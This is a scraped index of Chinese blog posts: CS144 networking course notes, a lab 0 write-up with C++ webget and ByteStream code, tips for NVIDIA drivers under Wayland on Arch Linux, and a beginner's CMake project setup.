链路层的工作就是将数据在链接中不断的跳转。链路层的应用的例子就是以太网和 WiFi 等 ","date":"2024-07-22","objectID":"/posts/cs144_notes_001/:2:1","tags":["CS144_notes"],"title":"网络应用协议 \u0026 网络分层模型 \u0026 设计原则","uri":"/posts/cs144_notes_001/"},{"categories":["刷课笔记"],"content":"网络层 网络层的工作是在互联网中将数据端对端的传送给对方。网络层的数据包(也叫数据报, datagram)的 header 会附带源地址和目标地址的信息。网络层会将数据包给链路层，让链路层通过第一个链接传递数据。链路层会将它跳到路由，路由的链路层接收到之后再传递给路由的网络层，这里的网络层会检查这个数据报的目标地址，并将其向目标地址跳一下。路由再传递到路由，直到到达目标地址。 链路层的具体实现方式并不是一种（例如以太网或 WiFi ），但网络层通过接口传递数据报，这种分离的效果使得网络层无需关注链路层的细节。 在网络层中，通过 Internet 传递数据就需要用到 IP 协议 (Internet Protocol)。 IP 尽可能尝试将数据报传递到目的地，但其本身并不保证这一点。 IP 数据报可能会丢失，传递不按顺序，也可能会损坏，它没有保证这些。 ","date":"2024-07-22","objectID":"/posts/cs144_notes_001/:2:2","tags":["CS144_notes"],"title":"网络应用协议 \u0026 网络分层模型 \u0026 设计原则","uri":"/posts/cs144_notes_001/"},{"categories":["刷课笔记"],"content":"传输层 最常见的传输层的协议就是 TCP (Transmission Control Protocol)。TCP 确保了数据会以正确的顺序并传递过去，并且传输过程中数据报丢失了的话会重发。TCP 保证了运行在网络层之上的服务是的网络连接是可靠的。 相应的，有不保证顺序，也不会在丢失的时候重发的 UDP (User Datagram Protocol) 协议。UDP 只是将应用层的数据送到网络层。 常用的就是 TCP 和 UDP 了，但实际上还有其他的协议(比如 RTP )。 ","date":"2024-07-22","objectID":"/posts/cs144_notes_001/:2:3","tags":["CS144_notes"],"title":"网络应用协议 \u0026 网络分层模型 \u0026 设计原则","uri":"/posts/cs144_notes_001/"},{"categories":["刷课笔记"],"content":"应用层 应用层就是常见的那些 http, smtp, ssh, ftp 之类的了。 ","date":"2024-07-22","objectID":"/posts/cs144_notes_001/:2:4","tags":["CS144_notes"],"title":"网络应用协议 \u0026 网络分层模型 \u0026 设计原则","uri":"/posts/cs144_notes_001/"},{"categories":["刷课笔记"],"content":"ISO七层模型 ","date":"2024-07-22","objectID":"/posts/cs144_notes_001/:2:5","tags":["CS144_notes"],"title":"网络应用协议 \u0026 网络分层模型 \u0026 设计原则","uri":"/posts/cs144_notes_001/"},{"categories":["刷课笔记"],"content":"IP 服务 当传输层需要传输数据的时候，传输层将数据发送到下一层——网络层。网络层会将数据放到 IP 数据报中，IP 的工作就是将它发送到另一端。IP 数据包需要通过链路层进行传输，所以它要将数据包发送给链路层，链路层将其放到数据帧(frame)中(例如以太网数据包)，然后送到第一个路由器中。 IP 并不可靠，它不保证数据报一定到达，更不会保证到达的顺序，甚至在必要的时候会丢弃数据报（比如路由器中的数据报队列满了）。 这么设计是为了以下几点 更加简单，容易维护，消费更低，速度更快。 端到端原则：尽可能在端测主机实现功能，而不是在网络硬件中。 允许顶层构建可能可靠或不可靠的服务。 对下层的链路层要求更低，对链路层没有太多的假设条件。 IP 服务的细节 IP 尝试阻止数据报永远循环。 由于路由器转发表错误，可能导致数据报一直在循环发送。 引入了 TTL 字段解决这个问题，TTL 每通过一个路由器都递减一次，如果到 0 了，就认为处于循环的状态，由路由器丢弃它。 IP 会对太长的数据报分段 IP 被设计为各种链路工作，不同链路对数据报大小的要求不一致。 比如 Ethernet 携带的数据报长度不能超过 1500 字节。 IP 的 header 包含一些字段用于帮助路由器将一个数据报分开，并向对面主机提供信息需要重组数据。 IP 数据报 header 包含一个校验和字段，以确保数据报到达正确的位置。 IP 有两种版本 IPV4: 当前广泛使用，32 bit 的地址 IPV6: 128 bit 地址。 IP 允许新字段加入数据报 header 中。 IPV4 数据报 header 的细节 Destination IP Address: 目标地址。 Source IP Address: 源地址。 Protocol ID: 数据字段的内容。允许目标主机对包解开并复用，如果 Portocal ID 是6，则该数据就包含一个 TCP 段。IANA 定义了 140+种不同的协议值。 Version: IP 当前的版本，V4 还是 V6。 Total Packet Length: 数据报总长度。 TTL: 防止数据报永远处于循环状态。 Packet ID, Flags, Fragment Offset: 帮助路由器将 IP 数据报分成小份。 Type of Service: 向路由器提示该数据报的重要性。 Header Length: header 的长度，帮助自定义 header 字段。 Checksum: 防止发送到错误的地方。 ","date":"2024-07-22","objectID":"/posts/cs144_notes_001/:2:6","tags":["CS144_notes"],"title":"网络应用协议 \u0026 网络分层模型 \u0026 设计原则","uri":"/posts/cs144_notes_001/"},{"categories":["刷课笔记"],"content":"数据包的一生 互联网四层模型中，从应用层获取数据流，传输层将其可靠地传递给另一台计算机上的应用程序。传输层将这些作为网络层数据包发送，网络层将其传递给另一台计算机。 以 TCP 流为例 客户端通过三次握手和服务器连接: 当客户端发送服务器一个 synchronize 信息，通常称为 SYN。 服务端收到 SYN 后，发送一个确认连接消息，通常称为 SYN-ACK。 客户端收到后，再回复一个确认信息 ACK。 为了标示将数据报传送给哪个应用程序，存在 TCP prot 用于标识。 客户端第一步跳到 WiFi 接入点，接入点存在一个 broader Ethernet 有线连接，所以数据报强制沿着线路跳。路由器连接很多链路，当数据报到达时，路由器决定将其发送到哪个链路。 路由器有 IP 地址，所以它可能不为了一个包，而是用自己的软件发送。例如使用 TCP 登录路由器时，IP 数据报将被发送到路由器自己的 IP 地址。这是通过转发表实现。 数据报到达后，路由器检查那个转发条目和数据报最匹配。 可以使用 Wireshark 验证这一过程。 我认为现在没有什么网站是 HTTP 的了，我这里访问的是 BiliBili 所以三次握手后还有专属于 HTTPS 的 TLS 握手。 traceroute 可以 trace 数据包传递的每一跳的信息，但是貌似对方可以设置不回显，这样返回不了信息。 ","date":"2024-07-22","objectID":"/posts/cs144_notes_001/:2:7","tags":["CS144_notes"],"title":"网络应用协议 \u0026 网络分层模型 \u0026 设计原则","uri":"/posts/cs144_notes_001/"},{"categories":["刷课笔记"],"content":"设计原则 ","date":"2024-07-22","objectID":"/posts/cs144_notes_001/:3:0","tags":["CS144_notes"],"title":"网络应用协议 \u0026 网络分层模型 \u0026 设计原则","uri":"/posts/cs144_notes_001/"},{"categories":["刷课笔记"],"content":"原则：数据包切换 这是构建网络的常用做法。 独立每个到达的数据包，选择将其传出链路，如果该链路空闲就发送，否则保存并等待。 交换机可以为每个数据包单独做决定，不需要保留额外的数据包，它只需要负责转发。 例如语音电话由多个连续的数据包组成，它们属于同一组通信，将这种数据包序列称为流 (flow)。 由于各个数据包是独立的，所以交换机不需要处理整个流。 交换机不需要担心添加或删除流的状态，交换机会在合适的时候完成转发。交换机不会存储状态信息，因为交换机必须快速，将该状态存储到高速内存中的代价昂贵。 如果手机发出一个 web 请求后没电了，交换机将保存请求的 “per-flow state”，但如果其中一个节点创建状态失败后，交换机需要知道如何清除它，否则你可能面临被一堆流量占内存的情况。对于数据报切换来说，交换机不存储 “per-flow state”，如果手机没电了，交换机只会停止接收来自它的数据包。 因此，交换机在功能上就独立于发送流量的计算机。 更有效的共享链接 考虑到一点，用户使用的网络服务都是突发性的，不会以固定的频率发送和接收特定的数据。 将所有流量都视作数据包，可以做到：假如 A 在阅读网页，B 在加载网页，路由器可以将A的容量都放B的数据包。如果 A 和 B 都在使用，那么路由器在二者之间共享。 采取单一资源并以概率方式在多个用户之间共享的想法被称为统计复用。每个用户都会获得基于多少用户正在使用的资源的统计份额。例如 A 正在阅读，B 就可以使用所有的链路，如果两个人都在加载页面，那都得到一半的链路容量。 ","date":"2024-07-22","objectID":"/posts/cs144_notes_001/:3:1","tags":["CS144_notes"],"title":"网络应用协议 \u0026 网络分层模型 \u0026 设计原则","uri":"/posts/cs144_notes_001/"},{"categories":["刷课笔记"],"content":"分层原则 就是模块化，每层只为它的上层，抽象接口。 ","date":"2024-07-22","objectID":"/posts/cs144_notes_001/:3:2","tags":["CS144_notes"],"title":"网络应用协议 \u0026 网络分层模型 \u0026 设计原则","uri":"/posts/cs144_notes_001/"},{"categories":["刷课笔记"],"content":"封装原则 封装是将分层和数据报切换结合发生的结果。 发送一个数据包时，每个数据包都包含来自多个层的数据。例如 TCP 段位于 IP 数据包内，而 IP 数据包又会在以太网帧内。封装就是这个原则。 关于封装的数据包，有两种画法: 第一种是硬件的视角，header 在右边，右边也是第一位，离开交换机的第一位是最右边的位。 第二种是软件的视角，header 在左边，许多文档和协议都这么画，这么画的出发点是数据包的开头是地址0，而左边是地址0，所以 header 在左边。 VPN 服务示例 VPN (Virtual Private Network) 当你与互联网通信并发送 IP 数据包而不是正常发送它们时，它们会被发送到 VPN 连接中，以便 IP 数据包到达私有网络内。 在这种路线中，HTTP 被 TCP 封装，TCP 被 IP 封装，IP 被 TLS 封装，而 TLS 再被 TCP 封装，这个 TCP 被 IP 封装。 外层的 TCP/IP 都是用于到达 VPN 网关而用，内部的 TCP/IP 用来访问具体的 web server。 ","date":"2024-07-22","objectID":"/posts/cs144_notes_001/:3:3","tags":["CS144_notes"],"title":"网络应用协议 \u0026 网络分层模型 \u0026 设计原则","uri":"/posts/cs144_notes_001/"},{"categories":["刷课_Lab"],"content":"CS144 课程 Lab Assignment 中的  Checkpoint 0: networking warmup","date":"2024-07-21","objectID":"/posts/cs144_lab0/","tags":["CS144_lab"],"title":"CS144-2024-lab_0: networking warmup","uri":"/posts/cs144_lab0/"},{"categories":["刷课_Lab"],"content":"CS144 课程 Lab Assignment 中的 Checkpoint 0: networking warmup CS144-2024-lab_0: networking warmup ","date":"2024-07-21","objectID":"/posts/cs144_lab0/:0:0","tags":["CS144_lab"],"title":"CS144-2024-lab_0: networking warmup","uri":"/posts/cs144_lab0/"},{"categories":["刷课_Lab"],"content":"环境搭建 官方给出了四种环境方式，由于我本机就是 Arch Linux。第一个 lab 我是用的自己的本机做的。我安装了一个 Debian 12 的虚拟机，我准备用那个虚拟机做后续需要用到虚拟机的 lab。 也比较简单，装完后执行以下下述命令装一些必要的软件即可: $ sudo apt update \u0026\u0026 sudo apt install git cmake gdb build-essential clang clang-tidy clang-format pkg-config glibc-doc tcpdump tshark clangd 我这里去掉了 gcc-doc，因为我虚拟机装 Debian 的时候提示没有这个软件包，而且我也没认识到特地本机装 GCC 的文档的意义何在，我还加了 clangd，因为我习惯用 clangd 了。 ","date":"2024-07-21","objectID":"/posts/cs144_lab0/:1:0","tags":["CS144_lab"],"title":"CS144-2024-lab_0: networking warmup","uri":"/posts/cs144_lab0/"},{"categories":["刷课_Lab"],"content":"Networking by hand telnet 过去之后最好把 GET /hello HTTP/1.1 这些直接粘贴过去，自己手敲容易超时导致断开连接。 我只尝试了 telnet cs144.keithw.org http ","date":"2024-07-21","objectID":"/posts/cs144_lab0/:2:0","tags":["CS144_lab"],"title":"CS144-2024-lab_0: networking warmup","uri":"/posts/cs144_lab0/"},{"categories":["刷课_Lab"],"content":"Writing webget In this lab, you will simply use the operating system’s pre-existing support for the Transmission Control Protocol. You’ll write a program called “webget” that creates a TCP stream socket, connects to a Web server, and fetches a page—much as you did earlier in this lab. In future labs, you’ll implement the other side of this abstraction, by implementing the Transmission Control Protocol yourself to create a reliable byte-stream out of not-so-reliable datagrams. 在本实验中，您将仅使用操作系统对传输控制协议的现有支持。您将编写一个名为“webget”的程序，该程序创建 TCP stream socket、连接到 Web 服务器并获取页面 - 就像您前面所做的一样。在未来的实验中，您将实现此抽象的另一面，通过自己实现传输控制协议来从不太可靠的数据报中创建可靠的字节流。 void get_URL( const string\u0026 host, const string\u0026 path ) { const string\u0026 raw = \"GET \" + path + \" HTTP/1.1\\r\\n\" + \"Host: \" + host + \"\\r\\n\" + \"Connection: close\\r\\n\\r\\n\"; TCPSocket tcosocket{}; tcosocket.connect({host, \"http\"}); if (tcosocket.write(raw) != raw.length()) { cerr \u003c\u003c \"write error\\n\"; } while (!tcosocket.eof()) { string rs; tcosocket.read(rs); cout \u003c\u003c rs; } } 我这么写总感觉有些问题。 之前 raw 最后两个 \\r\\n，我只有一个，每次都是 408 超时，后来再这样加一个换行就没事了，难绷。 ","date":"2024-07-21","objectID":"/posts/cs144_lab0/:3:0","tags":["CS144_lab"],"title":"CS144-2024-lab_0: networking warmup","uri":"/posts/cs144_lab0/"},{"categories":["刷课_Lab"],"content":"An in-memory reliable byte stream To finish off this week’s lab, you will implement, in memory on a single computer, an object that provides this abstraction. (You may have done something similar in CS 110/111.) Bytes are written on the “input” side and can be read, in the same sequence, from the “output” side. The byte stream is finite: the writer can end the input, and then no more bytes can be written. When the reader has read to the end of the stream, it will reach “EOF” (end of file) and no more bytes can be read. 为了完成本周的实验，您将在一台计算机的内存中实现一个提供此抽象的对象。（您可能在 CS 110/111 中做过类似的事情。）字节在“输入”端写入，并可以按照相同的顺序从“输出”端读取。字节流是有限的：写入器可以结束输入，然后就不能再写入字节了。当读取器读到流的末尾时，它将到达“EOF”（文件末尾），并且不能再读取字节了。 首先在 byte_stream.hh 中多定义几个字段和函数，最后 ByteStream 类是这样: class ByteStream { public: explicit ByteStream( uint64_t capacity ); ByteStream\u0026 operator=(const ByteStream\u0026 val); ByteStream(ByteStream\u0026 val); ByteStream\u0026 operator=(ByteStream\u0026\u0026 val) noexcept ; ByteStream(ByteStream\u0026\u0026 val) noexcept ; // Helper functions (provided) to access the ByteStream's Reader and Writer interfaces Reader\u0026 reader(); const Reader\u0026 reader() const; Writer\u0026 writer(); const Writer\u0026 writer() const; void set_error() { error_ = true; }; // Signal that the stream suffered an error. bool has_error() const { return error_; }; // Has the stream had an error? protected: // Please add any additional state to the ByteStream here, and not to the Writer and Reader interfaces. uint64_t capacity_; uint64_t wcount_ {0}; uint64_t rcount_ {0}; std::deque\u003cchar\u003e buffer_; bool closeed_ {false}; bool error_ {}; }; 这里特地加了复制移动那些函数，是因为测试用例需要用，要不是编译报错，我也没想到需要写（逃。 在 byte_stream.cc 中实现那些函数: #include \"byte_stream.hh\" #include \u003ccstdint\u003e #include \u003cstring\u003e #include \u003cstring_view\u003e using namespace std; ByteStream::ByteStream( uint64_t capacity ) : capacity_( capacity ) {} ByteStream::ByteStream( ByteStream\u0026 val ) : capacity_( val.capacity_ ) , wcount_( val.wcount_ ) , rcount_( val.rcount_ ) , buffer_(val.buffer_) , closeed_( val.closeed_ ) {} ByteStream\u0026 ByteStream::operator=(const ByteStream\u0026 val) { this-\u003ecapacity_ = val.capacity_; this-\u003ebuffer_ = val.buffer_; this-\u003ewcount_ = val.wcount_; this-\u003ercount_ = val.rcount_; this-\u003ecloseed_ = val.closeed_; return *this; } ByteStream::ByteStream(ByteStream\u0026\u0026 val ) noexcept : capacity_( val.capacity_ ) , wcount_( val.wcount_ ) , rcount_( val.rcount_ ) , buffer_(std::move(val.buffer_)) , closeed_( val.closeed_ ) {} ByteStream\u0026 ByteStream::operator=(ByteStream\u0026\u0026 val) noexcept { this-\u003ecapacity_ =val.capacity_; this-\u003ebuffer_ = std::move(val.buffer_); this-\u003ewcount_ = val.wcount_; this-\u003ercount_ = val.rcount_; this-\u003ecloseed_ = val.closeed_; return *this; } bool Writer::is_closed() const { return closeed_; } void Writer::push( string data ) { if (is_closed() || has_error()) { return; } if (data.length() \u003e available_capacity()) { data.erase(available_capacity(), data.size() - available_capacity()); } for (const auto\u0026 c : data) { buffer_.emplace_back(c); } wcount_ += data.size(); } void Writer::close() { closeed_ = true; } uint64_t Writer::available_capacity() const { return capacity_ - (wcount_ - rcount_); } uint64_t Writer::bytes_pushed() const { return wcount_; } bool Reader::is_finished() const { return closeed_ \u0026\u0026 (wcount_ == rcount_); } uint64_t Reader::bytes_popped() const { return rcount_; } string_view Reader::peek() const { return {\u0026buffer_.front(), sizeof(char)}; } void Reader::pop( uint64_t len ) { buffer_.erase(buffer_.begin(), buffer_.begin() + len); rcount_ += len; } uint64_t Reader::bytes_buffered() const { return wcount_ - rcount_; } push 的实现还是有些丑陋了，但我一时间也不知道怎么改了。 ","date":"2024-07-21","objectID":"/posts/cs144_lab0/:4:0","tags":["CS144_lab"],"title":"CS144-2024-lab_0: networking warmup","uri":"/posts/cs144_lab0/"},{"categories":["刷课_Lab"],"content":"测评 cmake --build build -j`nproc` --target check0 Test project /home/zuos/codPjt/Cpp/minnow/build Connected to MAKE jobserver Start 1: compile with bug-checkers 1/10 Test #1: compile with bug-checkers ........ Passed 0.19 sec Start 2: t_webget 2/10 Test #2: t_webget ......................... Passed 1.07 sec Start 3: byte_stream_basics 3/10 Test #3: byte_stream_basics ............... Passed 0.02 sec Start 4: byte_stream_capacity 4/10 Test #4: byte_stream_capacity ............. Passed 0.01 sec Start 5: byte_stream_one_write 5/10 Test #5: byte_stream_one_write ............ Passed 0.01 sec Start 6: byte_stream_two_writes 6/10 Test #6: byte_stream_two_writes ........... Passed 0.01 sec Start 7: byte_stream_many_writes 7/10 Test #7: byte_stream_many_writes .......... Passed 0.04 sec Start 8: byte_stream_stress_test 8/10 Test #8: byte_stream_stress_test .......... Passed 0.20 sec Start 37: compile with optimization 9/10 Test #37: compile with optimization ........ Passed 0.10 sec Start 38: byte_stream_speed_test ByteStream throughput: 0.69 Gbit/s 10/10 Test #38: byte_stream_speed_test ........... Passed 0.16 sec 100% tests passed, 0 tests failed out of 10 Total Test time (real) = 1.82 sec Built target check0","date":"2024-07-21","objectID":"/posts/cs144_lab0/:5:0","tags":["CS144_lab"],"title":"CS144-2024-lab_0: networking warmup","uri":"/posts/cs144_lab0/"},{"categories":["Linux_杂谈"],"content":"如何在 GNU/Linux 发行版使用 Wayland 的情况下中舒服的使用 NVIDIA 驱动","date":"2024-07-19","objectID":"/posts/nvidia_with_linux/","tags":["linux","intro"],"title":"NVIDIA 在 GNU/Linux 发行版上和 Wayland 一起工作的技巧","uri":"/posts/nvidia_with_linux/"},{"categories":["Linux_杂谈"],"content":"如何在 GNU/Linux 发行版使用 Wayland 的情况下中舒服的使用 NVIDIA 驱动 NVIDIA 在 GNU/Linux 发行版上工作的技巧 ","date":"2024-07-19","objectID":"/posts/nvidia_with_linux/:0:0","tags":["linux","intro"],"title":"NVIDIA 在 GNU/Linux 发行版上和 Wayland 一起工作的技巧","uri":"/posts/nvidia_with_linux/"},{"categories":["Linux_杂谈"],"content":"Wayland 下 正常启动 根据 NVIDIA Transitions Fully Towards Open-Source GPU Kernel Modules 这篇 NVIDIA 的博客，目前 NVDIIA 准备在后续的版本完全换到 NVIDIA 开源内核模块（对 Turing 更高的版本来说），所以我也跟着使用了 nvidia-open。 对于 Wayland 来说，NVIDIA 需要启用 DRM (Direct Rendering Manager) kernel mode setting，即在内核参数中附加 nvidia_drm.modeset=1，这个需要在 /etc/default/grub 文件中写明: 在下面这行中添加 nvidia_drm.modeset=1。 GRUB_CMDLINE_LINUX=\"...\" 之后运行 grub-mkconfig -o /boot/grub/grub.cfg，如果你的 boot 分区和我不一致就去找一下你那个 boot 分区在哪吧。 如果你使用的是 systemd-boot，我并不知道 systemd-boot 该如何附加内核参数，可以去找找相关 wiki。 我在使用 KDE Plasma 6.1.2 + nvidia-open 555.58.02，附加了这个参数仍然无法正常进入桌面，但可以进入 SDDM 登录管理器，后来在 Arch Linux 的论坛中的一个帖子看到了一个解决办法——再多附加一个内核参数 nvidia_drm.fbdev=1。 所以我附加的内容就是: GRUB_CMDLINE_LINUX=\"nouveau.modeset=0 nvidia_drm.modeset=1 nvidia_drm.fbdev=1\" 这里第一个是为了禁用 nouveau 驱动，我印象中装了 NVIDIA 官方驱动后，默认就是禁用状态，不过我习惯添加这个了。 实际上我还做了一步：之前我发现 NVIDIA 貌似会在窗口管理器启动之后加载，于是我尝试提前将 NVIDIA 启动，即在 /etc/mkinitcpio.conf 文件中新加一些模块，类似这样: MODULES=(nvidia nvidia_modeset nvidia_uvm nvidia_drm) 之后执行 mkinitcpio -P，重新生成一遍 initramfs。 如果你是 Gentoo Linux，那么生成 initramfs 的方法可能不是这个，如果和我一样都是使用的 dracut 的话，可以参考 Gentoo wiki 中的 nvidia-drivers 部分 和 Arch wiki 中 dracut 条目。 之后直接 sudo dracut /path/to/initramfs ","date":"2024-07-19","objectID":"/posts/nvidia_with_linux/:1:0","tags":["linux","intro"],"title":"NVIDIA 在 GNU/Linux 发行版上和 Wayland 一起工作的技巧","uri":"/posts/nvidia_with_linux/"},{"categories":["Linux_杂谈"],"content":"正常休眠 我发现休眠也不好使了，这让我很难受。我的问题是这样：休眠后启动需要花费很长时间，这段时间就是黑屏，终于不是黑屏了之后还不完全显示锁屏界面，我凭借着记忆解锁后，只有那些已打开的窗口能正常显示，连锁屏壁纸都不正常显示，Ctrl + Alt + T 倒还能正常启动终端，我用 journalctl 查看了下系统日志，去 Arch Wiki 上找到了我的问题，就是日志显示: archlinux kernel: NVRM: GPU at PCI:0000:08:00: GPU-926ecdb0-adb1-6ee9-2fad-52e7214c5011 archlinux kernel: NVRM: Xid (PCI:0000:08:00): 13, pid='\u003cunknown\u003e', name=\u003cunknown\u003e, Graphi\u003e archlinux kernel: NVRM: Xid (PCI:0000:08:00): 13, pid='\u003cunknown\u003e', name=\u003cunknown\u003e, Graphi\u003e archlinux kernel: NVRM: Xid (PCI:0000:08:00): 13, pid='\u003cunknown\u003e', name=\u003cunknown\u003e, Graphi\u003e archlinux kernel: NVRM: Xid (PCI:0000:08:00): 13, pid='\u003cunknown\u003e', name=\u003cunknown\u003e, Graphi\u003e archlinux kernel: NVRM: Xid (PCI:0000:08:00): 13, pid='\u003cunknown\u003e', name=\u003cunknown\u003e, Graphi\u003e 这是 Arch Wiki 上提供的，正常这里的 archlinux 应该显示你的主机名，而 PCI 端口等信息也会不一致。 解决办法就是再搞个内核参数以保留 video memory。来源: https://wiki.archlinux.org/title/NVIDIA/Tips_and_tricks#Preserve_video_memory_after_suspend 我新建了一个 /etc/modprobe.d/nvidia-power-management.conf 文件 options nvidia NVreg_PreserveVideoMemoryAllocations=1 NVreg_PreserveVideoMemoryAllocations 也可以作为内核启动时的参数，可以直接写在 /etc/default/grub 中，写在内核参数的话需要在前面加上 nvidia: nvidia.NVreg_PreserveVideoMemoryAllocations=1。 之后执行 systemctl enable nvidia-resume.service nvidia-suspend.service nvidia-hibernate.service 并重启即可。 根据 Arch wiki 所述，这个不能和 NVIDIA 早启动一起使用，但实际上我一起用了，感觉没什么问题。 ","date":"2024-07-19","objectID":"/posts/nvidia_with_linux/:2:0","tags":["linux","intro"],"title":"NVIDIA 在 GNU/Linux 发行版上和 Wayland 一起工作的技巧","uri":"/posts/nvidia_with_linux/"},{"categories":["Linux_杂谈"],"content":"总结 用 Xorg 保心安，我当初用 Xorg 的时候还没这么些事。 ","date":"2024-07-19","objectID":"/posts/nvidia_with_linux/:3:0","tags":["linux","intro"],"title":"NVIDIA 在 GNU/Linux 发行版上和 Wayland 一起工作的技巧","uri":"/posts/nvidia_with_linux/"},{"categories":["Cpp"],"content":"我第一次尝试使用 CMake 等工具管理自己的 C++ 项目的记录","date":"2024-05-12","objectID":"/posts/cmake_intro/","tags":["Cpp notes","intro","CMake"],"title":"C++ 项目编写初步入门","uri":"/posts/cmake_intro/"},{"categories":["Cpp"],"content":"我第一次尝试使用 CMake 等工具管理自己的 C++ 项目的记录 C++ 项目编写初步入门 由于想要编写一个 C++ 的项目，所以开始学习 cmake 管理项目的编译工作。我这里会把 src 和 include 分开，并且尝试使用Google test做一些项目的简单测试。 并且我尝试使用 clang-tidy 和 clang-format 格式化我的代码，doxygen 生成项目 API 文档。 $ tree -a -L 2 . ├── build/ ├── CMakeLists.txt ├── compile_commands.json -\u003e build/compile_commands.json ├── doc │ ├── doxygen-awesome-css/ │ ├── html/ │ └── man/ ├── Doxyfile ├── LICENSE ├── README.md ├── README_ZH_CN.md ├── src │ ├── CMakeLists.txt │ ├── core │ │ ├── CMakeLists.txt │ │ └── pack_core.cpp │ ├── curl_cpp │ │ ├── CMakeLists.txt │ │ └── cppcurl.cpp │ ├── include │ │ ├── cppcurl.h │ │ ├── env.h │ │ ├── log.h │ │ ├── misc.h │ │ ├── os-detect.h │ │ └── pack_core.h │ ├── main.cpp │ └── utils │ ├── CMakeLists.txt │ ├── env.cpp │ ├── log.cpp │ └── os-detect.cpp ├── test │ ├── CMakeLists.txt │ └── main_test.cpp └── third_party ├── argparse/ ├── CMakeLists.txt ├── googletest/ └── json/ 上面这个就是我项目的基础结构，src 存放项目的源代码，src/include 从存放一些自定义的头文件，test 目录存放用于开发测试的代码文件，third_party 目录存放第三方库文件。 这里 tree -a -L 2 的输出，实际上我对它做了一些修改的工作，这里最后一级的文件夹我都加了 / 做区分，并且我认为不太重要的（如 .build, .git 文件夹）都删掉了它的下一级内容，并添加 / 表示它是文件夹。 ","date":"2024-05-12","objectID":"/posts/cmake_intro/:0:0","tags":["Cpp notes","intro","CMake"],"title":"C++ 项目编写初步入门","uri":"/posts/cmake_intro/"},{"categories":["Cpp"],"content":"CMake 简单使用 CMake is cross-platform free and open-source software for build automation, testing, packaging and installation of software by using a compiler-independent method. CMake is not a build system itself; it generates another system’s build files. It supports directory hierarchies and applications that depend on multiple libraries. It can invoke native build environments such as Make, Qt Creator, Ninja, Android Studio, Apple’s Xcode, and Microsoft Visual Studio. It has minimal dependencies, requiring only a C++ compiler on its own build system. CMake 是跨平台的自由开源软件，用于使用独立于编译器的方法构建自动化、测试、打包和安装软件。 CMake 本身并不是一个构建系统，它只是生成另一个系统的构建文件。它支持依赖于多个库的目录层次结构和应用程序。它可以调用本机构建环境，例如 Make、Qt Creator、Ninja、Android Studio、Apple 的 Xcode 和 Microsoft Visual Studio。它具有最小的依赖性，仅需要其自己的构建系统上的 C++ 编译器。 上面这段话来自 WikiPedia 我根目录的 CMakeLists.txt 文件的内容是： cmake_minimum_required(VERSION 3.13) set(CMAKE_CXX_STANDARD 17) set(CMAKE_CXX_STANDARD_REQUIRED ON) project(ReleaseButler VERSION 2024.5 DESCRIPTION \"package manager on GitHub\" LANGUAGES CXX ) add_subdirectory(src) add_subdirectory(third_party) if(NOT CMAKE_BUILD_TYPE AND NOT CMAKE_CONFIGURATION_TYPES) message(STATUS \"Setting build type to `Debug` as none was specified.\") set(CMAKE_BUILD_TYPE \"Debug\") endif() if(CMAKE_BUILD_TYPE STREQUAL \"Debug\") enable_testing() add_subdirectory(test) set(CMAKE_CXX_FLAGS_DEBUG \"${CMAKE_CXX_FLAGS_DEBUG} -Wall -Wextra -Werror\") endif() if(CMAKE_BUILD_TYPE STREQUAL \"Release\") message(STATUS \"Configuring Release build\") # something come form https://airbus-seclab.github.io/c-compiler-security/clang_compilation.html set(CMAKE_CXX_FLAGS_RELEASE \"${CMAKE_CXX_FLAGS_RELEASE} -O2 -pipe -fPIE -Wall -Wextra -Wpedantic -Werror\") set(CMAKE_CXX_FLAGS_RELEASE \"${CMAKE_CXX_FLAGS_RELEASE} -fstack-clash-protection -fstack-protector-all -fcf-protection=full\") set(CMAKE_CXX_FLAGS_RELEASE \"${CMAKE_CXX_FLAGS_RELEASE} -flto\") if (CMAKE_CXX_COMPILER_ID STREQUAL \"Clang\") set(CMAKE_CXX_FLAGS_RELEASE \"${CMAKE_CXX_FLAGS_RELEASE} -fsanitize=integer -fsanitize-minimal-runtime -fno-sanitize-recover\") set(CMAKE_CXX_FLAGS_RELEASE \"${CMAKE_CXX_FLAGS_RELEASE} -Wthread-safety -fvisibility=hidden -fsanitize=cfi\") elseif(CMAKE_CXX_COMPILER_ID STREQUAL \"GNU\") set(CMAKE_CXX_FLAGS_RELEASE \"${CMAKE_CXX_FLAGS_RELEASE} -fsanitize=address -fsanitize=undefined\") set(CMAKE_CXX_FLAGS_RELEASE \"${CMAKE_CXX_FLAGS_RELEASE} -fstack-protector-strong -D_FORTIFY_SOURCE=2\") set(CMAKE_CXX_FLAGS_RELEASE \"${CMAKE_CXX_FLAGS_RELEASE} -Wl,-z,relro,-z,now,-z,noexecstack\") endif() endif() file(TO_CMAKE_PATH \"${PROJECT_BINARY_DIR}/CMakeLists.txt\" PATH_TO_CMAKELISTS_TXT) if(EXISTS \"${PATH_TO_CMAKELISTS_TXT}\") message(FATAL_ERROR \"Run CMake from a build subdirectory! \\\"mkdir build ; cd build ; cmake ..\\\" \\ Some junk files were created in this folder (CMakeCache.txt, CMakeFiles); you should delete those.\") endif() # Compiler flags. set(CMAKE_POSITION_INDEPENDENT_CODE ON) message(STATUS \"CMAKE_CXX_FLAGS: ${CMAKE_CXX_FLAGS}\") if(CMAKE_BUILD_TYPE STREQUAL \"Debug\") message(STATUS \"CMAKE_CXX_FLAGS_DEBUG: ${CMAKE_CXX_FLAGS_DEBUG}\") elseif(CMAKE_BUILD_TYPE STREQUAL \"Release\") message(STATUS \"CMAKE_CXX_FLAGS_RELEASE: ${CMAKE_CXX_FLAGS_RELEASE}\") endif() message(STATUS \"CMAKE_EXE_LINKER_FLAGS: ${CMAKE_EXE_LINKER_FLAGS}\") message(STATUS \"CMAKE_SHARED_LINKER_FLAGS: ${CMAKE_SHARED_LINKER_FLAGS}\") 这里我对 Debug 模式和 Release 模式都设置了不同的编译选项，我因为个人的原因很希望 Release 模式编译出来的是尽可能安全些的，所以找了一些安全方面的编译选项。 由于 clang 实现了 CFI 保护，所以我这里检测当前编译环境的编译器如果是 clang 的话就启用该支持。 如果检测到是 GCC 环境的话也会启用相应的支持。 根目录下的 CMakeLists.txt 只是设置好相关的编译选项和一些基础设置，而后添加各个子目录的 CMakeLists.txt。 third_party 目录下的 CMakeLists.txt 判断如果是 Debug 的话就添加 googletest 库，并且把其他第三方库添加进去。 set(JSON_BuildTests OFF CACHE INTERNAL \"\") if(CMAKE_BUILD_TYPE STREQUAL \"Debug\") add_subdirectory(googletest) endif() add_subdirectory(argparse) test 目录下还有些东西，因为遇到额外添加 googletest 中的 include 到编译过程中，还要启用 testing cmake_minimum_required(VERSION 3.11) 